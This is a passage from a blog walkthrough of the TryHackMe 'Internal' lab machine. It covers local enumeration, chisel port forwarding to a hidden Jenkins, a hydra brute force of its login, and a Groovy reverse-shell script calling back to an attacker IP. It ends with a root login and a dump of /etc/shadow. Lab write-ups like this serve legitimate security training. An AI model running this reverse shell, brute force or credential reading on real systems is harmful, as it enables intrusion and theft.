aubrean<span style="color:#f92672">+</span>  <span style="color:#ae81ff">1574</span>  <span style="color:#ae81ff">1.7</span> <span style="color:#ae81ff">12.0</span> <span style="color:#ae81ff">2587808</span> <span style="color:#ae81ff">245668</span> <span style="color:#960050;background-color:#1e0010">?</span>      Sl   <span style="color:#ae81ff">09</span>:<span style="color:#ae81ff">07</span>   <span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">23</span> java <span style="color:#f92672">-</span>Duser<span style="color:#f92672">.</span>home<span style="color:#f92672">=/</span>var<span style="color:#f92672">/</span>jenkins_home <span style="color:#f92672">-</span>Djenkins<span style="color:#f92672">.</span>model<span style="color:#f92672">.</span>Jenkins<span style="color:#f92672">.</span>slaveAgentPort<span style="color:#f92672">=</span><span style="color:#ae81ff">50000</span> <span style="color:#f92672">-</span>jar <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>share<span style="color:#f92672">/</span>jenkins<span style="color:#f92672">/</span>jenkins<span style="color:#f92672">.</span>war
aubrean<span style="color:#f92672">+</span>  <span style="color:#ae81ff">1612</span>  <span style="color:#ae81ff">0.0</span>  <span style="color:#ae81ff">0.0</span>      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> <span style="color:#960050;background-color:#1e0010">?</span>        Z    <span style="color:#ae81ff">09</span>:<span style="color:#ae81ff">07</span>   <span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">00</span> [jenkins<span style="color:#f92672">.</span>sh] <span style="color:#f92672">&lt;</span>defunct<span style="color:#f92672">&gt;</span>
www<span style="color:#f92672">-</span>data  <span style="color:#ae81ff">5586</span>  <span style="color:#ae81ff">0.0</span>  <span style="color:#ae81ff">0.0</span>  <span style="color:#ae81ff">11464</span>  <span style="color:#ae81ff">1100</span> pts<span style="color:#f92672">/</span><span style="color:#ae81ff">0</span>    S<span style="color:#f92672">+</span>   <span style="color:#ae81ff">09</span>:<span style="color:#ae81ff">29</span>   <span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">00</span> grep <span style="color:#f92672">--</span>color<span style="color:#f92672">=</span>auto aubrean
</code></pre></div><p>Let&rsquo;s see the local listening ports:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">www<span style="color:#f92672">-</span>data<span style="color:#a6e22e">@internal</span>:<span style="color:#f92672">/</span>var<span style="color:#f92672">/</span>www<span style="color:#f92672">/</span>html<span style="color:#f92672">/</span>wordpress<span style="color:#960050;background-color:#1e0010">$</span> netstat <span style="color:#f92672">-</span>plnt
(Not all processes could be identified, non<span style="color:#f92672">-</span>owned process info
 will <span style="color:#f92672">not</span> be shown, you would have to be root to see it all<span style="color:#f92672">.</span>)
Active Internet connections (only servers)
Proto Recv<span style="color:#f92672">-</span>Q Send<span style="color:#f92672">-</span>Q Local Address           Foreign Address         State       PID<span style="color:#f92672">/</span>Program name    
tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">127.0</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0.1</span>:<span style="color:#ae81ff">33897</span>         <span style="color:#ae81ff">0.0</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0.0</span>:<span style="color:#f92672">*</span>               LISTEN      <span style="color:#f92672">-</span>                   
tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">127.0</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0.1</span>:<span style="color:#ae81ff">3306</span>          <span style="color:#ae81ff">0.0</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0.0</span>:<span style="color:#f92672">*</span>               LISTEN      <span style="color:#f92672">-</span>                   
tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">127.0</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0.1</span>:<span style="color:#ae81ff">8080</span>          <span style="color:#ae81ff">0.0</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0.0</span>:<span style="color:#f92672">*</span>               LISTEN      <span style="color:#f92672">-</span>                   
tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">127.0</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0.53</span>:<span style="color:#ae81ff">53</span>           <span style="color:#ae81ff">0.0</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0.0</span>:<span style="color:#f92672">*</span>               LISTEN      <span style="color:#f92672">-</span>                   
tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0.0</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0.0</span>:<span style="color:#ae81ff">22</span>              <span style="color:#ae81ff">0.0</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0.0</span>:<span style="color:#f92672">*</span>               LISTEN      <span style="color:#f92672">-</span>                   
tcp6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> :::<span style="color:#ae81ff">80</span>                   :::<span style="color:#f92672">*</span>                    LISTEN      <span style="color:#f92672">-</span>                   
tcp6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> :::<span style="color:#ae81ff">22</span>                   :::<span style="color:#f92672">*</span>                    LISTEN      <span style="color:#f92672">-</span>                   

</code></pre></div><p>Port <code>8080</code> is listening locally, let&rsquo;s try and cURL and see the repsonse it.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">www<span style="color:#f92672">-</span>data<span style="color:#a6e22e">@internal</span>:<span style="color:#f92672">/</span>var<span style="color:#f92672">/</span>www<span style="color:#f92672">/</span>html<span style="color:#f92672">/</span>wordpress<span style="color:#960050;background-color:#1e0010">$</span> curl <span style="color:#f92672">-</span>i http:<span style="color:#f92672">//</span><span style="color:#ae81ff">127.0</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0.1</span>:<span style="color:#ae81ff">8080</span>
HTTP<span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">403</span> Forbidden
Date: Wed, <span style="color:#ae81ff">07</span> Apr <span style="color:#ae81ff">2021</span> <span style="color:#ae81ff">09</span>:<span style="color:#ae81ff">30</span>:<span style="color:#ae81ff">54</span> GMT
X<span style="color:#f92672">-</span>Content<span style="color:#f92672">-</span>Type<span style="color:#f92672">-</span>Options: nosniff
Set<span style="color:#f92672">-</span>Cookie: JSESSIONID<span style="color:#f92672">.</span><span style="color:#ae81ff">992</span>b29b3<span style="color:#f92672">=</span>node01ii80j993afao35bpvwstyvpu0<span style="color:#f92672">.</span>node0; Path<span style="color:#f92672">=/</span>; HttpOnly
Expires: Thu, <span style="color:#ae81ff">01</span> Jan <span style="color:#ae81ff">1970</span> <span style="color:#ae81ff">00</span>:<span style="color:#ae81ff">00</span>:<span style="color:#ae81ff">00</span> GMT
Content<span style="color:#f92672">-</span>Type: text<span style="color:#f92672">/</span>html;charset<span style="color:#f92672">=</span>utf<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>
X<span style="color:#f92672">-</span>Hudson: <span style="color:#ae81ff">1.395</span>
X<span style="color:#f92672">-</span>Jenkins: <span style="color:#ae81ff">2.250</span>
X<span style="color:#f92672">-</span>Jenkins<span style="color:#f92672">-</span>Session: <span style="color:#ae81ff">56</span>d53c37
X<span style="color:#f92672">-</span>Hudson<span style="color:#f92672">-</span>CLI<span style="color:#f92672">-</span>Port: <span style="color:#ae81ff">50000</span>
X<span style="color:#f92672">-</span>Jenkins<span style="color:#f92672">-</span>CLI<span style="color:#f92672">-</span>Port: <span style="color:#ae81ff">50000</span>
X<span style="color:#f92672">-</span>Jenkins<span style="color:#f92672">-</span>CLI2<span style="color:#f92672">-</span>Port: <span style="color:#ae81ff">50000</span>
X<span style="color:#f92672">-</span>You<span style="color:#f92672">-</span>Are<span style="color:#f92672">-</span>Authenticated<span style="color:#f92672">-</span>As: anonymous
X<span style="color:#f92672">-</span>You<span style="color:#f92672">-</span>Are<span style="color:#f92672">-</span>In<span style="color:#f92672">-</span>Group<span style="color:#f92672">-</span>Disabled: JENKINS<span style="color:#f92672">-</span><span style="color:#ae81ff">39402</span>: use <span style="color:#f92672">-</span>Dhudson<span style="color:#f92672">.</span>security<span style="color:#f92672">.</span>AccessDeniedException2<span style="color:#f92672">.</span>REPORT_GROUP_HEADERS<span style="color:#f92672">=</span>true <span style="color:#f92672">or</span> use <span style="color:#f92672">/</span>whoAmI to diagnose
X<span style="color:#f92672">-</span>Required<span style="color:#f92672">-</span>Permission: hudson<span style="color:#f92672">.</span>model<span style="color:#f92672">.</span>Hudson<span style="color:#f92672">.</span>Read
X<span style="color:#f92672">-</span>Permission<span style="color:#f92672">-</span>Implied<span style="color:#f92672">-</span>By: hudson<span style="color:#f92672">.</span>security<span style="color:#f92672">.</span>Permission<span style="color:#f92672">.</span>GenericRead
X<span style="color:#f92672">-</span>Permission<span style="color:#f92672">-</span>Implied<span style="color:#f92672">-</span>By: hudson<span style="color:#f92672">.</span>model<span style="color:#f92672">.</span>Hudson<span style="color:#f92672">.</span>Administer
Content<span style="color:#f92672">-</span>Length: <span style="color:#ae81ff">793</span>
Server: Jetty(<span style="color:#ae81ff">9.4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">30.</span>v20200611)

<span style="color:#f92672">&lt;</span>html<span style="color:#f92672">&gt;&lt;</span>head<span style="color:#f92672">&gt;&lt;</span>meta http<span style="color:#f92672">-</span>equiv<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;refresh&#39;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1;url=/login?from=</span><span style="color:#e6db74">%2F</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">/&gt;&lt;</span>script<span style="color:#f92672">&gt;</span>window<span style="color:#f92672">.</span>location<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;/login?from=</span><span style="color:#e6db74">%2F</span><span style="color:#e6db74">&#39;</span>);<span style="color:#f92672">&lt;/</span>script<span style="color:#f92672">&gt;&lt;/</span>head<span style="color:#f92672">&gt;&lt;</span>body style<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;background-color:white; color:white;&#39;</span><span style="color:#f92672">&gt;</span>


Authentication required
<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">!</span><span style="color:#f92672">--</span>
You are authenticated <span style="color:#66d9ef">as</span>: anonymous
Groups that you are <span style="color:#f92672">in</span>:
  
Permission you need to have (but didn<span style="color:#e6db74">&#39;t): hudson.model.Hudson.Read</span>
 <span style="color:#f92672">...</span> which <span style="color:#f92672">is</span> implied by: hudson<span style="color:#f92672">.</span>security<span style="color:#f92672">.</span>Permission<span style="color:#f92672">.</span>GenericRead
 <span style="color:#f92672">...</span> which <span style="color:#f92672">is</span> implied by: hudson<span style="color:#f92672">.</span>model<span style="color:#f92672">.</span>Hudson<span style="color:#f92672">.</span>Administer
<span style="color:#f92672">--&gt;</span>

<span style="color:#f92672">&lt;/</span>body<span style="color:#f92672">&gt;&lt;/</span>html<span style="color:#f92672">&gt;</span>    
</code></pre></div><p>&ndash;</p>
<h4 id="port-forwarding-8080">Port Forwarding (8080)</h4>
<p>Interesting, let&rsquo;s try and do port forwarding utilziing <strong>chisel</strong> and access the port locally on our own attacker machine.</p>
<p>We can do so by doing the following on attacker/victim machines:</p>
<p><strong>Victim:</strong></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">www<span style="color:#f92672">-</span>data<span style="color:#a6e22e">@internal</span>:<span style="color:#f92672">/</span>tmp<span style="color:#960050;background-color:#1e0010">$</span> <span style="color:#f92672">./</span>chisel<span style="color:#f92672">-</span>umar0x01 server <span style="color:#f92672">-</span>p <span style="color:#ae81ff">47000</span> 
<span style="color:#ae81ff">2021</span><span style="color:#f92672">/</span><span style="color:#ae81ff">04</span><span style="color:#f92672">/</span><span style="color:#ae81ff">07</span> <span style="color:#ae81ff">09</span>:<span style="color:#ae81ff">34</span>:<span style="color:#ae81ff">08</span> server: Fingerprint auG3MXyqO68Dyisj38bk<span style="color:#f92672">+</span>g<span style="color:#f92672">/</span>QRvnlc<span style="color:#f92672">/</span>xVxcjh<span style="color:#f92672">/</span>ulpye4<span style="color:#f92672">=</span>
<span style="color:#ae81ff">2021</span><span style="color:#f92672">/</span><span style="color:#ae81ff">04</span><span style="color:#f92672">/</span><span style="color:#ae81ff">07</span> <span style="color:#ae81ff">09</span>:<span style="color:#ae81ff">34</span>:<span style="color:#ae81ff">08</span> server: Listening on http:<span style="color:#f92672">//</span><span style="color:#ae81ff">0.0</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0.0</span>:<span style="color:#ae81ff">47000</span>
</code></pre></div><p><strong>Attacker:</strong></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#960050;background-color:#1e0010">â”Œâ”€â”€</span>(root<span style="color:#960050;background-color:#1e0010">ðŸ’€</span>b0x)<span style="color:#f92672">-</span>[<span style="color:#f92672">/</span>var<span style="color:#f92672">/</span>www<span style="color:#f92672">/</span>html]
<span style="color:#960050;background-color:#1e0010">â””â”€</span><span style="color:#75715e"># ./chisel-umar0x01 client 10.10.25.58:47000 2222:127.0.0.1:8080                                                                                                                                           127 â¨¯</span>
<span style="color:#ae81ff">2021</span><span style="color:#f92672">/</span><span style="color:#ae81ff">04</span><span style="color:#f92672">/</span><span style="color:#ae81ff">07</span> <span style="color:#ae81ff">14</span>:<span style="color:#ae81ff">35</span>:<span style="color:#ae81ff">23</span> client: Connecting to ws:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">25.58</span>:<span style="color:#ae81ff">47000</span>
<span style="color:#ae81ff">2021</span><span style="color:#f92672">/</span><span style="color:#ae81ff">04</span><span style="color:#f92672">/</span><span style="color:#ae81ff">07</span> <span style="color:#ae81ff">14</span>:<span style="color:#ae81ff">35</span>:<span style="color:#ae81ff">23</span> client: tun: proxy<span style="color:#75715e">#2222=&gt;8080: Listening</span>
<span style="color:#ae81ff">2021</span><span style="color:#f92672">/</span><span style="color:#ae81ff">04</span><span style="color:#f92672">/</span><span style="color:#ae81ff">07</span> <span style="color:#ae81ff">14</span>:<span style="color:#ae81ff">35</span>:<span style="color:#ae81ff">24</span> client: Connected (Latency <span style="color:#ae81ff">187.684044</span>ms)
</code></pre></div><p>&ndash;</p>
<p>We got the connection:</p>
<p><img src="/img/internal-thm/Pasted%20image%2020210407143622.png" alt=""></p>
<p>Now, let&rsquo;s connect to the <code>localhost</code> port <code>2222</code> and see if we can access the forwarded port.</p>
<p>Alright, the port was hosting jenkins!</p>
<p><img src="/img/internal-thm/Pasted%20image%2020210407143723.png" alt=""></p>
<h3 id="post-exploitation">Post Exploitation</h3>
<p>Again the login form! :|</p>
<p>Let&rsquo;s run hydra for jenkins bruteforcing!</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#960050;background-color:#1e0010">â”Œâ”€â”€</span>(root<span style="color:#960050;background-color:#1e0010">ðŸ’€</span>b0x)<span style="color:#f92672">-</span>[<span style="color:#f92672">/</span>mnt<span style="color:#f92672">/</span>hgfs<span style="color:#f92672">/</span>THM<span style="color:#f92672">/</span>Internal]
<span style="color:#960050;background-color:#1e0010">â””â”€</span><span style="color:#75715e"># hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 2222 http-post-form &#39;/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in:F=Invalid&#39; -I                   130 â¨¯</span>
Hydra v9<span style="color:#f92672">.</span><span style="color:#ae81ff">1</span> (c) <span style="color:#ae81ff">2020</span> by van Hauser<span style="color:#f92672">/</span>THC <span style="color:#f92672">&amp;</span> David Maciejak <span style="color:#f92672">-</span> Please do <span style="color:#f92672">not</span> use <span style="color:#f92672">in</span> military <span style="color:#f92672">or</span> secret service organizations, <span style="color:#f92672">or</span> <span style="color:#66d9ef">for</span> illegal purposes (this <span style="color:#f92672">is</span> non<span style="color:#f92672">-</span>binding, these <span style="color:#f92672">***</span> ignore laws <span style="color:#f92672">and</span> ethics anyway)<span style="color:#f92672">.</span>

Hydra (https:<span style="color:#f92672">//</span>github<span style="color:#f92672">.</span>com<span style="color:#f92672">/</span>vanhauser<span style="color:#f92672">-</span>thc<span style="color:#f92672">/</span>thc<span style="color:#f92672">-</span>hydra) starting at <span style="color:#ae81ff">2021</span><span style="color:#f92672">-</span><span style="color:#ae81ff">04</span><span style="color:#f92672">-</span><span style="color:#ae81ff">07</span> <span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">05</span>:<span style="color:#ae81ff">14</span>
[INFO] Using HTTP Proxy: http:<span style="color:#f92672">//</span><span style="color:#ae81ff">127.0</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0.1</span>:<span style="color:#ae81ff">8080</span>
[WARNING] Restorefile (ignored <span style="color:#f92672">...</span>) <span style="color:#f92672">from</span> a previous session found, to prevent overwriting, <span style="color:#f92672">./</span>hydra<span style="color:#f92672">.</span>restore
[DATA] max <span style="color:#ae81ff">16</span> tasks per <span style="color:#ae81ff">1</span> server, overall <span style="color:#ae81ff">16</span> tasks, <span style="color:#ae81ff">14344399</span> login tries (l:<span style="color:#ae81ff">1</span><span style="color:#f92672">/</span>p:<span style="color:#ae81ff">14344399</span>), <span style="color:#f92672">~</span><span style="color:#ae81ff">896525</span> tries per task
[DATA] attacking http<span style="color:#f92672">-</span>post<span style="color:#f92672">-</span>form:<span style="color:#f92672">//</span><span style="color:#ae81ff">127.0</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0.1</span>:<span style="color:#ae81ff">2222</span><span style="color:#f92672">/</span>j_acegi_security_check:j_username<span style="color:#f92672">=^</span>USER<span style="color:#f92672">^&amp;</span>j_password<span style="color:#f92672">=^</span>PASS<span style="color:#f92672">^&amp;</span>from<span style="color:#f92672">=%</span><span style="color:#ae81ff">2</span>F<span style="color:#f92672">&amp;</span>Submit<span style="color:#f92672">=</span>Sign<span style="color:#f92672">+</span><span style="color:#f92672">in</span>:F<span style="color:#f92672">=</span>Invalid

[<span style="color:#ae81ff">2222</span>][http<span style="color:#f92672">-</span>post<span style="color:#f92672">-</span>form] host: <span style="color:#ae81ff">127.0</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0.1</span>   login: admin   password: <span style="color:#f92672">...</span>
<span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> target successfully completed, <span style="color:#ae81ff">1</span> valid password found
Hydra (https:<span style="color:#f92672">//</span>github<span style="color:#f92672">.</span>com<span style="color:#f92672">/</span>vanhauser<span style="color:#f92672">-</span>thc<span style="color:#f92672">/</span>thc<span style="color:#f92672">-</span>hydra) finished at <span style="color:#ae81ff">2021</span><span style="color:#f92672">-</span><span style="color:#ae81ff">04</span><span style="color:#f92672">-</span><span style="color:#ae81ff">07</span> <span style="color:#ae81ff">15</span>:<span style="color:#ae81ff">05</span>:<span style="color:#ae81ff">40</span>
</code></pre></div><p>http://127.0.0.1:2222/script</p>
<p><code>admin:...</code></p>
<p>Getting code execution on Jenkins, we know that it supports groovy script execution.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">command</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;cat /etc/passwd&#34;</span>
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">proc</span> <span style="color:#f92672">=</span> command<span style="color:#f92672">.</span>execute()
proc<span style="color:#f92672">.</span>waitFor()
println <span style="color:#e6db74">&#34;Std Out: ${proc.in.text}&#34;</span>
</code></pre></div><p><img src="/img/internal-thm/Pasted%20image%2020210407151404.png" alt=""></p>
<p>The above doesn&rsquo;t work due to some reason for reverse shell. We can use the following snippet from this <a href="https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76">gist</a>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">String host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;10.17.0.120&#34;</span>;
int port<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span>;
String cmd<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/bin/bash&#34;</span>;
Process p<span style="color:#f92672">=</span>new ProcessBuilder(cmd)<span style="color:#f92672">.</span>redirectErrorStream(true)<span style="color:#f92672">.</span>start();Socket s<span style="color:#f92672">=</span>new Socket(host,port);InputStream pi<span style="color:#f92672">=</span>p<span style="color:#f92672">.</span>getInputStream(),pe<span style="color:#f92672">=</span>p<span style="color:#f92672">.</span>getErrorStream(), si<span style="color:#f92672">=</span>s<span style="color:#f92672">.</span>getInputStream();OutputStream po<span style="color:#f92672">=</span>p<span style="color:#f92672">.</span>getOutputStream(),so<span style="color:#f92672">=</span>s<span style="color:#f92672">.</span>getOutputStream();<span style="color:#66d9ef">while</span>(<span style="color:#960050;background-color:#1e0010">!</span>s<span style="color:#f92672">.</span>isClosed()){<span style="color:#66d9ef">while</span>(pi<span style="color:#f92672">.</span>available()<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span>)so<span style="color:#f92672">.</span>write(pi<span style="color:#f92672">.</span>read());<span style="color:#66d9ef">while</span>(pe<span style="color:#f92672">.</span>available()<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span>)so<span style="color:#f92672">.</span>write(pe<span style="color:#f92672">.</span>read());<span style="color:#66d9ef">while</span>(si<span style="color:#f92672">.</span>available()<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span>)po<span style="color:#f92672">.</span>write(si<span style="color:#f92672">.</span>read());so<span style="color:#f92672">.</span>flush();po<span style="color:#f92672">.</span>flush();Thread<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">50</span>);<span style="color:#66d9ef">try</span> {p<span style="color:#f92672">.</span>exitValue();<span style="color:#66d9ef">break</span>;}catch (<span style="color:#a6e22e">Exception</span> e){}};p<span style="color:#f92672">.</span>destroy();s<span style="color:#f92672">.</span>close();
</code></pre></div><p>Got shell!</p>
<hr>
<p>Enumerating the container found <code>/opt/note.txt</code>. It contained the following:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">jenkins<span style="color:#a6e22e">@jenkins</span>:<span style="color:#f92672">/</span>opt<span style="color:#960050;background-color:#1e0010">$</span> cat note<span style="color:#f92672">.</span>txt
cat note<span style="color:#f92672">.</span>txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here<span style="color:#f92672">.</span>  Use them <span style="color:#66d9ef">if</span> you 
need access to the root user account<span style="color:#f92672">.</span>

root:<span style="color:#f92672">...</span>
</code></pre></div><hr>
<h3 id="getting-root">Getting root!</h3>
<p>Now, let&rsquo;s try the following credentials as the <code>root</code> user.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">www<span style="color:#f92672">-</span>data<span style="color:#a6e22e">@internal</span>:<span style="color:#f92672">/</span>tmp<span style="color:#960050;background-color:#1e0010">$</span> su <span style="color:#f92672">-</span> root
Password: 
root<span style="color:#a6e22e">@internal</span>:<span style="color:#f92672">~</span><span style="color:#75715e"># </span>
root<span style="color:#a6e22e">@internal</span>:<span style="color:#f92672">~</span><span style="color:#75715e"># id</span>
uid<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>(root) gid<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>(root) groups<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>(root)
root<span style="color:#a6e22e">@internal</span>:<span style="color:#f92672">~</span><span style="color:#75715e"># head /etc/shadow</span>
root:<span style="color:#f92672">...</span>:<span style="color:#ae81ff">18477</span>:<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">99999</span>:<span style="color:#ae81ff">7</span>:::
daemon:<span style="color:#f92672">*</span>:<span style="color:#ae81ff">18295</span>:<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">99999</span>:<span style="color:#ae81ff">7</span>:::
</code></pre></div><p>r00t! This machine was purely based on enumeration. Hopefully, you enjoyed reading the walkthrough!</p>

    </div>
    
      
        <div class="pagination">
          <div class="pagination__title">
            <span class="pagination__title-h">Read other posts</span>
            <hr />
          </div>
          <div class="pagination__buttons">
            
            
              <span class="button next">
                <a href="https://umar0x01.sh/post/debug-thm/">
                  <span class="button__text">Debug - TryHackMe - THM Walkthrough</span>
                  <span class="button__icon">â†’</span>
                </a>
              </span>
            
          </div>
        </div>
      
    


    
      
        <div id="disqus_thread"></div>
<script type="application/javascript">
    var disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "umar0x01" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
      
    

    
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
	ga('create', 'UA-177361132-1', 'auto');
	
	ga('send', 'pageview');
}
</script>

    </div>

      </div>

      
        <footer class="footer">
  <div class="footer__inner">
    
      <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
</svg>
</span>
    <span class="logo__text">$ cd /home/umar_0x01/</span>
    <span class="logo__cursor"></span>
  
</a>

      <div class="copyright">
        <span>Â© 2021 <a href="https://github.com/Anon-Exploiter" target="_blank" rel="noopener">Umar_0x01</a></span>
        <span> twitter<a href="https://twitter.com/syed__umar" target="_blank" rel="noopener">@syed__umar</a>&nbsp;</span>
        <span> <a href="https://umar0x01.sh/archive" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
      </div>
    
  </div>
</footer>
<script src="https://umar0x01.sh/assets/main.js"></script>
<script src="https://umar0x01.sh/assets/prism.js"></script>








      
    </div>

    
      
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
	ga('create', 'UA-177361132-1', 'auto');
	
	ga('send', 'pageview');
}
</script>
    
  </body>
</html>
